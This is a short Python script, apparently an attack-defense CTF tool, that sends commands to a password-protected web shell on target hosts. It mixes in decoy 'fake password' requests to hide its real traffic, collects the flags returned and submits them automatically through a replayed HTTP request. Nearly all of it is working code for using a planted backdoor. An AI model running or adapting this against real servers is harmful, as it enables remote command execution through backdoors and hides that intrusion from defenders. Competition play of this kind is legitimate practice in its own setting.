#coding:utf-8
# author : p0desta
import requests
import paramiko
import threading
import  time
import argparse
import urllib
from fakepayloads import *
def do_command(url,passwd,cmd,p):
    data = {
    "pass":"987aed24dbac1610cd95edb012fcdf35",
    passwd:cmd
    }
    try:
        status = requests.get(url=url,timeout=0.1).status_code
    except:
        return
    if status == 200:
        data2 = data.copy()
        send_fake_passwd(url,data2)
        flag = requests.post(url=url,data=data).content.strip()
        send_fake_passwd(url,data2)
        print flag
    else:
        return

    with open("result.txt","a") as file:
        file.write(flag+"\n")
    if p == "1":
        if sendflag(flag):
            print flag + "---" + url +"----success submit"
        else:
            print flag + "****submit error"
def sendflag(flag):
    lines = open("send.txt","rb").readlines()
    cookies = {}
    for line in lines[1:-1]:
        if "Cookie:" in line:
            values =  line.split(" ")
            for v in values[1:-1]:
                v = v.strip().split("=")
                cookies[v[0]] = v[1][0:-1]
            v = values[-1].strip().split("=")
            cookies[v[0]] = v[-1]
    if "POST" in lines[0]:
        url =  "http://" + lines[1].split(":")[1].strip() + lines[0].split(" ")[1]

        datas = lines[-1].strip().split("&")
        data = {}
        for s in datas:
            data[s.split("=")[0]] = s.split("=")[1].replace("{flag}",flag)
        content = requests.post(url=url,data=data,cookies=cookies).content
    elif "GET" in lines[0]:
        url =  "http://" + lines[1].split(":")[1].strip() + lines[0].split(" ")[1].replace("{flag}",urllib.quote(flag))
        content = requests.get(url=url,cookies=cookies).content
    return 1